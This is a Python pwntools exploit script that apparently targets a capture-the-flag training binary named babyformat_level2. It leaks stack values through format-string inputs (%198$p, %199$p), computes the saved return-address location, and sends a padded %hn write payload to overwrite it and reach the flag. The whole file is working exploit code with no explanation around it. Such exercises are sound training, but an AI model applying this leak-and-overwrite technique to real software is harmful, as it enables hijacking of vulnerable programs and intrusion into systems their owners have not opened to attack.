from pwn import *
io = process('/challenge/babyformat_level2')
buf = b"%198$p"
io.sendline(buf)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rbp = io.recvline(keepends=False)
print(f"leaked_rbp : {leaked_rbp}")

buf = b"%199$p"
io.sendline(buf)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rip = io.recvline(keepends=False)
print(f"leaked_rip : {leaked_rip}")

buf1 = b"%198$p"
io.sendline(buf1)
io.recvuntil(b"Your input is:")
io.recvline()
leaked_rbp = int(io.recvline(keepends=False), 16)
print(f"leaked_rbp : {leaked_rbp}")
rbp_func = leaked_rbp - 5550838544
rip_func = rbp_func+8
print(hex(rbp_func))
print(hex(rip_func))
payload = b'A'*602 + b"%199$hn" + p64(rip_func)
io.sendline(payload)
io.recvuntil(b'flag:')
io.interactive()
